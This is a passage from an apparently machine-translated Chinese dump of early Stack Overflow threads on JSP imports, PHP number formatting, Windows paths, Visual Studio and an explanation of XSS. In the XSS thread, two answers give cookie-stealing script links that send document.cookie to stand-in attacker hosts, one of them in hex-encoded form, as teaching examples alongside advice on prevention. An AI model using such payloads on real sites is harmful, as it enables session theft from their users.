> 时间：2012-03-01T14:24:49.930

jedediah 的 ruby​​ 脚本效果很好。要对正在复制的资源进行排序，您可以添加：

```
state = :group if line =~ /^\s*files\s*=\s*\x28\s*$/ 
```

请注意，排序区分大小写（大写字母在前）。要使其不敏感，请使用：

```
group << [$1.downcase,line] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-05-05T08:57:24.583

XCode5 中确实没有一个简单的解决方案。

*   我在文本编辑器中打开了 pbxproj 文件。
*   向下导航到 /* Begin PBXResourcesBuildPhase 部分 */
*   选择文件中的所有内容。
*   复制到新的文本文档。
*   将 /* 替换为 \t（制表符）
*   全选，复制并粘贴到空白的excel文档中。你应该有 2 列数据
*   在位置 2 处插入一列
*   为该列创建所有行 /*
*   对第 3 列的工作表进行排序
*   复制所有数据并粘贴回 pbxproj 文件中的部分
*   保存存档

这应该对项目的“复制捆绑资源”部分进行排序。

这样做我觉得很脏，但是嘿 - 它有效

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2010-11-24T12:32:30.157

Czar 以您想要的方式拥有它有很多好处，而不是始终自动对其进行排序。

有些类可能以某种方式相关，但名称并不相邻，我肯定会使用它。:)

# winapi - Windows：鼠标按下窗口装饰

> ID：239141
> 
> 赞同：5
> 
> 时间：2008-10-27T05:21:07.650
> 
> 标签：winapi, mouse, rendering, nonclient

在几乎所有 Windows 应用程序中，我注意到在非客户区按住鼠标按钮会导致绘制停止。为什么需要这个？

例如，我有一个 Managed Direct 3D 应用程序，它显示一个旋转的立方体。如果我将指针放在标题栏上并按住鼠标按钮，即使我没有将任何此类条件编码到我的循环中，立方体也会停止旋转。

为什么绘画停止了？有什么好处？最重要的是，我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-27T06:02:19.080

当您单击标题栏时，窗口管理器会尝试确定您是单击还是开始拖动（移动窗口）时会[出现短暂的停顿。](http://blogs.msdn.com/oldnewthing/archive/2006/02/20/535440.aspx)如果您仍然按住按钮，那么这是一个拖动：窗口管理器设置自己的消息循环并泵送消息，直到您释放鼠标。您的窗口应该仍然能够处理消息，因为它们仍然会被分派，但是如果您的动画依赖于自定义消息循环，那么您将被卡住，直到模态拖动循环结束。

通过触发动画来响应消息来解决这个问题：计时器对我来说似乎是一个不错的选择。

# java - 如何在 JSP 中导入类？

> ID：239147
> 
> 赞同：243
> 
> 时间：2008-10-27T05:26:18.683
> 
> 标签：java, jsp

我是一个完整的 JSP 初学者。我正在尝试`java.util.List`在 JSP 页面中使用 a 。我需要做什么才能使用除 in 之外的类`java.lang`？

* * *

## 回答 #1

> 赞同：360
> 
> 时间：2008-10-27T07:50:59.330

使用以下导入语句导入`java.util.List`：

```
<%@ page import="java.util.List" %> 
```

顺便说一句，要导入多个类，请使用以下格式：

```
<%@ page import="package1.myClass1,package2.myClass2,....,packageN.myClassN" %> 
```

* * *

## 回答 #2

> 赞同：52
> 
> 时间：2008-10-28T02:40:55.523

仅供参考 - 如果您将 List 导入 JSP，那么您很可能违反了 MVC 原则。*现在*花几个小时来阅读 Web 应用程序开发的[MVC 方法](https://en.wikipedia.org/wiki/Model-view-controller)（包括使用 taglibs） - 多在谷歌上搜索一下这个主题，这很有趣，肯定会帮助您编写更好的应用程序。

如果您正在做比显示一些数据库结果的单个 JSP 更复杂的事情，请考虑使用[Spring](https://docs.spring.io/spring/docs/2.0.x/reference/mvc.html)、[Grails](http://grails.asia/grails-tutorial-for-beginners-model-view-controller-mvc-pattern/)等框架......这绝对会让您付出更多努力，但它会为您节省很多我真的推荐它的道路上的时间和精力。此外，这是很酷的东西:-)

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2008-10-27T06:17:03.247

在页面标签中：

```
<%@ page import="java.util.List" %> 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2017-08-24T09:38:08.967

如果您使用 JSTL 并且希望在标记页面而不是 jsp 页面中导入类，则语法会有些不同。用“标签”一词替换“页面”一词。

而不是桑德曼的正确答案

```
<%@page import="path.to.your.class"%> 
```

采用

```
<%@tag import="path.to.your.class"%> 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2016-12-22T14:02:36.653

这是导入类的语法

```
 <%@ page import="package.class" %> 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2016-12-29T08:45:06.783

使用 Page Directive 在 JSP 页面中导入一个类。页面指​​令使用 11 种不同类型的属性，其中之一是“导入”。带有 import 属性的页面指令 允许您在同一位置提及多个包，以逗号（，）分隔。或者，您可以拥有多个页面元素实例，每个实例都具有不同的包。

例如：

```
 <%@ page import = "java.io.*" %>
 <%@ page import = "java.io.*", "java.util.*"%> 
```

注意：import 属性应该放在调用导入类的元素之前。

# microsoft-sync-framework - 同步框架资源

> ID：239150
> 
> 赞同：11
> 
> 时间：2008-10-27T05:31:25.023
> 
> 标签：microsoft-sync-framework, occasionallyconnected

我正在寻找有关 Microsoft Sync Framework 的资源。尽管 MSDN 和 Google 搜索给了我简要概述，但我想要一些演示和演示文稿。

另外，Live Mesh 是基于 Sync Framework 的吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-10-27T14:29:34.610

也许这些链接会有所帮助：

*   [Sync101 - 同步入门](http://code.msdn.microsoft.com/sync/Release/ProjectReleases.aspx?ReleaseId=615)
*   [教程 - Microsoft 同步框架基础](http://code.msdn.microsoft.com/sync/Release/ProjectReleases.aspx?ReleaseId=949)
*   SQL [Express - 客户端同步示例](http://code.msdn.microsoft.com/sync/Release/ProjectReleases.aspx?ReleaseId=1200)
*   [ADO.NET v2 的同步服务 - 仅下载同步](http://code.msdn.microsoft.com/Release/ProjectReleases.aspx?ProjectName=sync&ReleaseId=1344)
*   [ADO.NET 适配器生成器的同步服务](http://code.msdn.microsoft.com/Release/ProjectReleases.aspx?ProjectName=sync&ReleaseId=1343)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-21T23:14:53.523

Live Mesh 不基于同步框架，尽管它们都使用 FeedSync。Live Mesh (Live Framework) 和 Sync Framework 合作开发了一个适用于 Sync Framework V2 的 Live Framework 提供程序。有关详细信息，请参阅以下演示文稿：

[http://channel9.msdn.com/pdc2008/TL30/](http://channel9.msdn.com/pdc2008/TL30/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-10-31T20:44:01.590

Sync Framework 2.0 已经发布，相关的[MSDN 文档](http://msdn.microsoft.com/en-us/library/bb902854(SQL.105).aspx)包含大量示例。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-29T03:32:14.940

对于使用 NoSQL DB，couchbase mobile 支持通过 Sync Gateway 与 couchbase 服务器同步。非常可扩展的解决方案。 [http://www.couchbase.com/mobile#sync-gateway](http://www.couchbase.com/mobile#sync-gateway)。

# multithreading - 在服务中设置线程优先级无效

> ID：239160
> 
> 赞同：2
> 
> 时间：2008-10-27T05:41:27.437
> 
> 标签：multithreading, winapi, process, windows-services, thread-priority

在我可以在 Windows 服务中设置线程优先级之前是否需要一些额外的配置？

在我的服务中，我有几个线程，每个线程都调用该`CreateProcess()`函数来启动外部应用程序。我想根据其他一些因素将线程（或进程）优先级调整为`normal`或。`lower`

问题是`SetThreadPriority()`函数失败并出现错误 6（无效句柄？）。我正在传递一个从`PROCESS_INFORMATION::hThread`（当然是在调用之后`CreateProcess()`）获得的句柄，所以我认为句柄*应该*是有效的。

我还尝试使用该`SetPriorityClass()`功能设置进程的优先级，但也失败了。

该服务以本地用户身份登录。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T07:28:16.287

也许您没有正确的访问权限？[SetThreadPriority 上的 MSDN](http://msdn.microsoft.com/en-us/library/ms686277(VS.85).aspx)说：

> hThread [in] 要设置其优先级值的线程的句柄。
> 
> 句柄必须具有 THREAD_SET_INFORMATION 或 THREAD_SET_LIMITED_INFORMATION 访问权限。有关详细信息，请参阅线程安全和访问权限。
> 
> Windows Server 2003 和 Windows XP/2000：句柄必须具有 THREAD_SET_INFORMATION 访问权限。

# java - Java 数据网格控件

> ID：239162
> 
> 赞同：7
> 
> 时间：2008-10-27T05:42:02.473
> 
> 标签：java, database, user-interface, grid

那里有任何第三方企业数据网格控件，alla JIDE Data Grid？有没有像 tory.net 这样列出第三方 Java 控件的网站？谷歌并没有出现太多，我认为考虑到 java 似乎有多受欢迎，两者都会有很多。

TIA

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-11-20T01:08:48.463

大多数 Java 框架都提供这种组件或小部件。您可以查看 SWT（来自 eclipse），它们是非常好的东西： http: [//www.eclipse.org/swt/](http://www.eclipse.org/swt/)。您还可以从[http://trolltech.com/products/appdev/programming-language-support](http://trolltech.com/products/appdev/programming-language-support)查看 Jambi（Java 中的 Qt） 。现在，如果您进入网络应用程序，则有无限的选择。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T05:47:36.597

我通常会在诸如 [http://www.componentsource.com/features/grids/java-components/index.html之类的组件销售网站上查看](http://www.componentsource.com/features/grids/java-components/index.html)

乔纳森·瓦克斯 jwaxster@gmail.com

# php - 在php中将5-7位数字转换为xxx/xxx/xxx格式的最干净的方法是什么？

> ID：239171
> 
> 赞同：4
> 
> 时间：2008-10-27T05:49:32.820
> 
> 标签：php, regex

我有一组 5、6 和 7 位数字。我需要它们以 000/000/000 格式显示。例如：

12345 将显示为 000/012/345

和

9876543 将显示为 009/876/543

我知道如何以凌乱的方式做到这一点，涉及一系列 if/else 语句和 strlen 函数，但必须有一种更简洁的方式涉及我没有看到的正则表达式。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2008-10-27T05:53:16.180

sprintf 和模是一种选择

```
function formatMyNumber($num)
{
    return sprintf('%03d/%03d/%03d',
                   $num / 1000000,
                  ($num / 1000) % 1000,
                   $num % 1000);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-27T06:28:27.903

```
$padded = str_pad($number, 9, '0', STR_PAD_LEFT);
$split = str_split($padded, 3);
$formatted = implode('/', $split); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-27T06:57:56.923

你要求一个正则表达式解决方案，我喜欢和他们一起玩，所以这里有一个正则表达式解决方案！
我仅出于教育（和娱乐）目的而展示它，只需使用 Adam 的解决方案，干净、易读且快速。

```
function FormatWithSlashes($number)
{
    return substr(preg_replace('/(\d{3})?(\d{3})?(\d{3})$/', '$1/$2/$3',
            '0000' . $number),
            -11, 11);
}

$numbers = Array(12345, 345678, 9876543);
foreach ($numbers as $val)
{
    $r = FormatWithSlashes($val);
    echo "<p>$r</p>";
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T06:41:16.473

好吧，人们都在扔东西，所以我也会！

`number_format`会很棒，因为它接受千位分隔符，但它不会填充零`sprintf`之类的。所以这就是我想出的单线：

```
function fmt($x) {
    return substr(number_format($x+1000000000, 0, ".", "/"), 2);
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-27T11:26:30.797

对 PhiLho 建议的小改进：

您可以通过将正则**表达式**更改为：

```
function FormatWithSlashes($number)
{
    return preg_replace('/^0*(\d{3})(\d{3})(\d{3})$/', '$1/$2/$3',
            '0000' . $number);
} 
```

我也删除了**？**在前两个捕获组中的每一个之后，因为当给定一个 5、6 或 7 位数字（如问题中指定的那样）时，这将始终至少有 9 位数字可供使用。如果您想防止收到较小输入数字的可能性，请针对**'000000000' 运行正则表达式。$number**代替。

或者，您可以使用

```
substr('0000' . $number, -9, 9); 
```

然后在适当的地方用**substr_replace**拼接斜线，我怀疑这可能是最快的方法（不需要运行正则表达式或进行除法），但这实际上只是进入毫无意义的优化，正如所提供的任何解决方案一样仍然比与服务器建立网络连接要快得多。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-27T21:20:35.793

### 如果使用`Perl 5.10`.

```
use 5.010;

sub myformat(_;$){

  # prepend with zeros
  my $_ = 0 x ( 9-length($_[0]) ) . $_[0];

  my $join = $_[1] // '/'; # using the 'defined or' operator `//`

  # m// in a list context returns ($1,$2,$3,...)
  join $join, m/ ^ (\d{3}) (\d{3}) (\d{3}) $ /x;

} 
```

经测试：

```
$_ = 11111;
say myformat;
say myformat(2222);
say myformat(33333,';');
say $_; 
```

返回：

```
000/011/111
000/002/222
000;033;333
11111

```

向后移植到`Perl 5.8`：

```
sub myformat(;$$){
  local $_ = @_ ? $_[0] : $_

  # prepend with zeros
  $_ = 0 x ( 9-length($_) ) . $_;

  my $join = defined($_[1]) ? $_[1] :'/';

  # m// in a list context returns ($1,$2,$3,...)
  join $join, m/ ^ (\d{3}) (\d{3}) (\d{3}) $ /x;

} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-27T05:56:47.297

这是我在 python 中的做法（对不起，我也不了解 PHP）。我相信你可以转换它。

```
def convert(num): #num is an integer
    a = str(num)
    s = "0"*(9-len(a)) + a
    return "%s/%s/%s" % (s[:3], s[3:6], s[6:9]) 
```

这只是将数字填充为长度 9，然后拆分子字符串。话虽如此，模数答案似乎要好一些。

# sql-server - SQL Server Reporting Services 自定义页面布局

> ID：239181
> 
> 赞同：1
> 
> 时间：2008-10-27T05:58:18.010
> 
> 标签：sql-server, sql-server-2005, reporting-services

是否可以根据报告类型定义布局？IE。PDF 的布局大小与 Web 布局不同。

假设我们将报告发布到网络上。用户可以选择将此自定义报告导出为 PDF。我们希望能够指定导出为 PDF 时报告的外观。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T13:37:18.817

必须在报告甚至呈现之前定义布局。该报告没有预先知道它在导出时将采用什么形式。

我的建议是：

*   根据是要成为 PDF 还是网页，创建两个具有不同布局的独立报告。
*   调整您的布局，使其可以很好地导出为两种格式。

# asp.net - Visual Studio 为我的项目中的所有网站打开开发服务器

> ID：239193
> 
> 赞同：1
> 
> 时间：2008-10-27T06:09:13.183
> 
> 标签：asp.net, visual-studio, visual-studio-2008

我目前有一个包含 8 个 Web 应用程序的 Visual Studio 解决方案。当我尝试运行其中一个应用程序时，会启动 8 个 Casini Web 开发服务器实例。

无论如何指定只有我设置为启动项目的Web应用程序将被启动，而不是全部8。

我正在使用 Visual Studio 2008

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T14:20:41.757

选择解决方案。右键单击并选择属性。在通用属性下选择启动项目。选择Single Startup Project，选择要启动的项目，按Apply/OK。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-01-26T21:53:12.117

还有一个项目选项`Always start when debugging`。在解决方案视图中选择项目，然后在属性窗口中将此选项设置为`false`。没有它，即使没有选择项目作为启动项目，服务器也会启动。

# xss - XSS 是如何工作的？

> ID：239194
> 
> 赞同：35
> 
> 时间：2008-10-27T06:12:26.720
> 
> 标签：xss

有人可以用简单的英语解释 XSS 是如何工作的吗？也许举个例子。谷歌搜索没有多大帮助。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2008-10-27T06:37:57.917

跨站脚本基本上是动态网页的安全漏洞，攻击者可以创建恶意链接将不需要的可执行 JavaScript 注入网站。当 GET 变量被打印或回显而不过滤或检查其内容时，此漏洞最常见的情况发生。

当受害者单击链接时，恶意代码可以将受害者的 cookie 发送到另一台服务器，或者它可以修改受影响的站点、注入表单、窃取用户名和密码以及其他网络钓鱼技术。

恶意链接示例：

```
http://VulnerableHost/a.php?variable=<script>document.location='http://AttackersHost/cgi-bin/cookie.cgi%3Fdata='+document.cookie</script> 
```

对恶意代码进行编码也很常见，例如以十六进制编码：

```
http://VulnerableHost/a.php?variable=%22%3E%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%41%74%74%61%63%6B%65%72%73%48%6F%73%74%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%2E%63%67%69%3F%20%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73%63%72%69%70%74%3E 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2009-01-09T23:42:08.593

只要来自应用程序外部的字符串可以被解释为代码，就会存在 XSS 漏洞。

例如，如果您通过执行以下操作生成 HTML：

```
<BODY>
  <?= $myQueryParameter ?>
</BODY> 
```

那么如果`$myQueryParameter`变量包含一个`<SCRIPT>`标签，那么它将最终执行代码。

要防止输入作为代码执行，您需要正确**转义**内容。

上述问题可以通过意识到`$myQueryParameter`变量包含纯文本来解决，但您不能只是将纯文本放入 HTML 中并期望它能够工作。

因此，您需要将纯文本转换为 HTML，以便将其放入 HTML 页面。将一种语言的字符串转换为另一种语言以便可以嵌入的过程正在转义。

您可以使用以下函数将纯文本转义为 HTML：

```
function escapePlainTextToHTML(plainText) {
  return plainText.replace(/\0/g, '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&#34;')
      .replace(/'/g, '&#39;');
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-04-08T05:24:17.787

简而言之， **XSS**是一个安全漏洞，攻击者可以在其中构建恶意脚本来破坏网站。现在**它是如何工作的？**

正如我们所知，**XSS**需要一个输入字段，或者我们可以说 GET 变量通过它输入是回显给用户，无需过滤，有时甚至过滤。请求后，浏览器可以接受（“源代码”）作为向用户显示内容的响应。**请记住您在输入字段中写的内容，它将在源代码响应中**。因此您应该检查它，因为有时 Web 开发人员会限制警告框。

如果您首先是攻击者，您需要通过使用脚本标签来了解 xss 漏洞。

例如：-警报（“测试”）

**这里 alert() 用于制作带有 ok 按钮的弹出框，您在括号中写的任何内容都会在屏幕上弹出**。并且脚本标签是不可见的。

现在攻击者可以制作恶意脚本来窃取 cookie、窃取凭据等。

> 例如：- hxxp://www.VulnerableSite.com/index.php?search=location.href = '<a href="http://www.Yoursite.com/Stealer.php?cookie="rel=" nofollow noreferrer">http://www.Yoursite.com/Stealer.php?cookie='+document.cookie;

在这里，您的站点是攻击者站点，在该站点上，攻击者可以借助 document.cookie 将受害者的 cookie 重定向到他自己的站点上。

而已。

这里脚本标签不可见

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-05-27T06:30:29.560

**简单英语**

XSS 是指在网页中插入脚本（即 JavaScript 代码），以便浏览器执行代码。这是恶意的，因为它可以用来窃取 cookie 和页面上的任何其他数据。例如：

搜索框的 HTML：`<input value="*search value here*">`

现在，如果您 insert `" onmouseover="alert(1)`，最终的 HTML 将是`<input value="" onmouseover="alert(1)">` 当鼠标经过搜索框时，将执行“警报”。

**在“维基文本”中**

跨站点脚本 (XSS) 是一种通常在 Web 应用程序中发现的计算机安全漏洞。XSS 使攻击者能够将客户端脚本注入到其他用户查看的网页中。攻击者可能会利用跨站脚本漏洞绕过同源策略等访问控制。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-11-17T16:40:19.980

我写了一篇关于什么是 XSS 以及作为 PHP 开发人员如何解决它的文章。还有两种类型的 XSS 攻击的示例（持久性与非持久性）。

XSS 攻击有两种类型：

1.  非持久性：这将是一个特制的 URL，它将脚本作为参数之一嵌入到目标页面。讨厌的 URL 可以通过电子邮件发送出去，目的是诱使收件人点击它。目标页面错误地处理了参数，并且无意中将最初通过 URL 字符串传入的代码发送到了客户端机器。
2.  持久性：此攻击使用站点上的一个页面，该页面将表单数据保存到数据库中，而没有正确处理输入数据。恶意用户可以将讨厌的脚本作为典型数据字段（如姓氏）的一部分嵌入在客户端的 Web 浏览器上，在不知不觉中运行。通常，讨厌的脚本会被存储到数据库中，并在每个客户访问受感染页面时重新运行。

在此处查看更多信息： [http ://www.thedablog.com/what-is-xss/](http://www.thedablog.com/what-is-xss/ "什么是跨站脚本？")

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2012-11-07T08:51:59.977

跨站脚本 -

当网站信任用户而不过滤用户输入时导致的漏洞。用户输入会导致在站点上执行不需要的脚本。

1.  预防：

    *   使用 HTML 输入过滤器过滤用户输入

        （例如 php 中的 strip_tags、htmlspecialchars、htmlentities、mysql_real_string_escape）

CSRF：

当用户信任站点但站点可能会获取用户信息并滥用它时导致的漏洞。

1.  预防：

    *   每次呈现表单时都会唯一地自动生成一个 csrf_token。csrf_token 在表单提交时发送到服务器进行验证。例如[https://docs.djangoproject.com/en/dev/ref/contrib/csrf/](https://docs.djangoproject.com/en/dev/ref/contrib/csrf/)

# java - 在执行期间，Java 程序如何知道它使用了多少内存？

> ID：239202
> 
> 赞同：28
> 
> 时间：2008-10-27T06:25:12.137
> 
> 标签：java, memory, runtime

在执行期间，Java 程序如何知道它使用了多少内存？

我不在乎它的效率如何！

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2008-10-27T07:07:36.000

VonC 的答案是一个交互式解决方案 - 如果您想以编程方式了解，您可以使用[Runtime.totalMemory()](http://java.sun.com/javase/6/docs/api/java/lang/Runtime.html#totalMemory())找出 JVM 使用的总量，并使用[Runtime.freeMemory()](http://java.sun.com/javase/6/docs/api/java/lang/Runtime.html#freeMemory())找出仍有多少可用（即它已分配*给*JVM，但未*在 JVM 内*分配- 新对象可以使用此内存）。

这些是实例方法 - 使用[Runtime.getRuntime()](http://java.sun.com/javase/6/docs/api/java/lang/Runtime.html#getRuntime())首先获取单例实例。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-27T06:48:10.377

如果你在某处有一个 java1.6 并且你的程序在 java 1.4.2、1.5 或 1.6 中运行，你可以启动一个[visualVM 会话](https://visualvm.dev.java.net/)，连接到你的应用程序，并跟踪内存（等等）

![使用 Visual VM 监控应用程序的图像](https://visualvm.dev.java.net/images/docs/monitor.png)

（图片暂时不显示，请参考[监控应用](https://visualvm.dev.java.net/monitor_tab.html)说明。）

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-27T07:01:57.993

这并不准确，但粗略估计，只需减去`Runtime.getRuntime.freeMemory()`. `Runtime.getRuntime.totalMemory()`在程序开始时执行此操作以了解`JVM's`开销内存使用情况，并在稍后执行时执行此操作。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-10-27T07:00:38.557

java.lang.Runtime.totalMemory() 将为您提供所需的信息：http: [//java.sun.com/j2se/1.4.2/docs/api/java/lang/Runtime.html](http://java.sun.com/j2se/1.4.2/docs/api/java/lang/Runtime.html)

# visual-studio - DataTable 可视化工具从我的 Visual Studio 中消失了

> ID：239206
> 
> 赞同：6
> 
> 时间：2008-10-27T06:29:05.953
> 
> 标签：visual-studio, visual-studio-2005, dataset, visualizer

不久前，我注意到我的数据表旁边没有放大镜。我曾经拥有它，不知何故，有时它消失了……
有人见过这种情况吗？你知道如何帮助我再次查看我的数据表吗？

**更新：**我仍然对此一无所知。谁能指出我的方向，我什至应该从哪里开始寻找答案？非常感谢。

**更新：**我换了一台新电脑，还是同样的问题。但我指出它只存在于 Visual Studio 2005 中。在 Visual Studio 2008 中，我拥有完全正常的 DataSet 和 Datatable 可视化工具。所以我尝试重新安装 VS2005，以确保安装了所有组件，没有遗漏任何东西 - 但 Nada。仍然没有可视化器。

**更新：**找到我的问题的解决方案：[我的答案](https://stackoverflow.com/questions/239206/datatable-visualizer-disappeared-from-my-visual-studio/1978806#1978806)

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-12-30T07:00:37.560

我真的被这个问题困扰，所以我求助于微软支持，他们解决了我的问题！简短的解决方案是 My Documents\Visual Studio 2005\Visualizers 文件夹中的一个 DLL 显然已损坏。我删除了文件夹的所有内容，可视化工具又回来了。
长答案可以[在 Faruk Celik 写的这篇文章](http://blogs.msdn.com/farukcelik/archive/2009/11/24/where-s-my-good-old-friend-dataset-visualizer.aspx)中找到- 来自微软的人解决了我的问题。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-29T12:34:44.240

1.  创建一个新的干净项目，Visualizer 是否出现在那里？
2.  检查此文件是否存在：“\Program Files\Microsoft Visual Studio 8.0\Common7\Packages\Debugger\Visualizers\Microsoft.VisualStudio.Debugger.DataSetVisualizer.dll”
3.  检查 dll 是否已在 Visual Studio 中加载，打开您的项目，然后打开另一个 Visual Studio，将调试器附加到第一个 Visual Studio 中（确保选择了托管调试器）。在***调试***Visual Studio 中打开 Debug/Windows/Modules 以查看是否加载了 DataSetVisualizer。
4.  从管理控制台尝试***devenv /ResetSettings 。***

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2011-03-14T15:40:43.597

我知道这是一个旧帖子，但我一直在与同样的问题作斗争。没有什么能解决我的问题...我终于发现我一直在以兼容模式（Windows 7 操作系统）运行 Visual Studio。一旦我在没有设置兼容模式的情况下运行 devenv.exe，可视化工具再次出现。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-04-02T23:50:51.300

**试试devenv /** resetskippkgs ...

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2018-07-19T08:30:45.720

我正在使用 Visual Studio 2017，我遇到了同样的问题。我意识到我的文档中缺少可视化工具文件夹。我认为这与最近在办公室计算机上的 Windows 升级有关。我通过创建一个空的 Visualizers 文件夹解决了这个问题。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-12-29T14:37:55.850

我有同样的问题，它让我发疯。最后，在尝试了谷歌搜索和跟踪错误的许多建议后，我让它工作了。

1.  \Common7\IDE\devenv.exe /resetuserdata 在命令提示符下。
2.  我在 C:\Program Files\Microsoft Visual Studio 8\Common7\IDE\PublicAssemblies 和 \My Documents\Visual Studio 2005\ 上将 Microsoft.VisualStudio.Debugger.DataSetVisualizer.dll 重命名为 Microsoft.VisualStudio.Debugger.DataSetVisualizer.dll.test展示台

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-01-24T01:20:30.730

我遇到了同样的问题，当我将鼠标悬停在我的数据集变量上时，什么都不会出现。当我在 Watch 窗口中的数据集变量前面添加 my.forms 时，我终于能够看到数据集可视化工具

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2011-12-09T17:11:46.423

我尝试了这篇文章中的所有内容，但对我没有任何帮助。我正在运行 Windows 7 64 位。最终我能够在[这篇文章中找到解决方案](https://stackoverflow.com/questions/8408234/visual-studio-dataset-and-datatable-visualizer-not-working-in-watch-window/8448629#8448629)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-10-30T14:22:34.357

以管理员身份执行 Visual Studio。右键单击并以管理员身份执行，放大镜出现在数据表旁边。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-12-11T13:21:43.540

我在这里尝试了所有方法，但唯一对我有用的是使用其他人 VS 2019 覆盖 2 个文件夹，该 VS 2019 具有可视化工具。

1.  C:\Users\XXXXXXXX\Documents\Visual Studio 2019\Visualizers --< XXXXXXXX = 用户文件夹
2.  C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\Common7\Packages\Debugger\Visualizers

# jquery - jQuery 如何实现 hide() 和 show()

> ID：239207
> 
> 赞同：50
> 
> 时间：2008-10-27T06:29:09.650
> 
> 标签：jquery, css

他们设置`display: none`或`visibility: hidden`？

我很确定`display: none`将元素从正常流程中取出，而`visibility: hidden`只是隐藏了元素，但仍然为它保留了空间。

我应该去下载解压版本并研究它还是有人有一个快速的答案？

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2008-10-27T06:41:06.583

它使用`display`.

编辑：约翰希恩对此答案的评论，我同意：

> 无论如何你都应该去查看解压后的源代码来熟悉它

编辑 2：评论提到使用 Firebug 来发现正在发生的事情。事实上，我实际上去了 jQuery 文档并使用 Safari Web Inspector 来查看`hide()`演示中发生的事情，以确定我的答案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T06:55:35.663

它使用显示，对于这种类型的事情，您可以使用 Firebug 来实际检查 DOM 发生了什么。

# windows - 假设路径 C:\WINDOWS\system32 始终存在是否安全？

> ID：239209
> 
> 赞同：9
> 
> 时间：2008-10-27T06:32:44.447
> 
> 标签：windows, operating-system

在 win 2000 或更高版本（任何语言）的操作系统上，我可以假设这条路径将始终存在吗？例如，我知道在某些语言的 win xp 上，“程序文件”目录具有不同的名称。System32 文件夹也是如此吗？

谢谢。哦哈德。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-10-27T07:03:57.863

您绝对不能假设：Windows 可以安装在不同的驱动器号或不同的目录中。例如，在以前的工作 PC 上，Windows 安装在 D:\WINNT 中。

简短的回答是使用 API 调用 GetSystemDirectory()，它将返回您所追求的路径。

更长的答案是问：你真的需要知道这个吗？如果您使用它将文件复制到 Windows 目录中，我建议您询问您是否真的要这样做。不鼓励复制到 Windows 目录，因为您可以很容易地弄乱其他应用程序。如果您使用路径来查找 DLL，为什么不直接依靠操作系统来找到合适的路径而不给出路径呢？如果您要深入研究操作系统文件的一部分，请考虑：这将来会起作用吗？一般来说，如果您希望您的程序在未来的 Windows 版本上运行，最好不要明确地在 Windows 目录中四处寻找。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2008-10-27T06:45:09.850

不，你不能这样假设。

Windows 可以安装到不同的路径。一种解决方案是通过调用 GetSystemDirectory（作为 Windows API 的一部分实现）来查找它。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-27T06:42:17.173

Windows 可以安装在不同的硬盘驱动器和/或不同的文件夹中。使用 %windir% 或 %systemroot% 环境变量将您带到 windows 文件夹并附加 system32。或者使用 %path% 变量，它通常是第一个入口，也是搜索 dlls AFAIK 等文件的首选方法。根据评论：不要过分依赖 system32 目录作为第一项。我确实认为可以安全地假设它在某个地方的 %path% 中。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-27T06:42:58.263

我会使用**GetWindowsDirectory** Win32 API 来获取当前的 Windows 目录，将**System32**附加到它，然后检查它是否存在。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-27T06:36:30.057

